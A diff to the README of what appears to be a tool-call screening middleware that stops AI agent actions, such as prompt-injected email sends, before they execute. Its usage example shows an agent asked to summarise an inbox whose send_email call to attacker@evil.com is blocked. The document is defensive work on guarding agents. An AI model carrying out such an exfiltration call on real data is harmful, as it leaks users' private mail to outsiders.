@@ -50,6 +50,38 @@ demo/          Trace visualizer — renders a run as an HTML report
 docs/          Project brief and design notes
 ```
 
+## Using it live
+
+`middleware.screening.live.Session` is the actual enforcement point — a
+wrapped tool function's body never runs when the verdict is block. Everywhere
+else in this repo evaluates a transcript of something that already happened;
+this is the one entrypoint that stops a call before it executes.
+
+```python
+from middleware.screening.live import Session, Blocked
+from adapters.judge import openai_judge
+
+session = Session("Summarize anything urgent in my inbox.", judge_fn=openai_judge())
+
+@session.protect
+def read_email():
+    return fetch_inbox()  # tool bodies are your own — wrap what you already have
+
+@session.protect
+def send_email(to, body):
+    return smtp_client.send(to, body)
+
+read_email()
+try:
+    send_email(to="attacker@evil.com", body="...")
+except Blocked as e:
+    print(e.trace.explanation)  # send_email's body never ran
+```
+
+Pass `melon_agent_call_fn` to wire in Stage 3 for ambiguous cases, or
+`on_ask_user` to handle escalations Stage 3 can't resolve; leaving both unset
+raises `NeedsConfirmation` instead of asking anyone.
+
 ## Running the benchmark
 
 ```
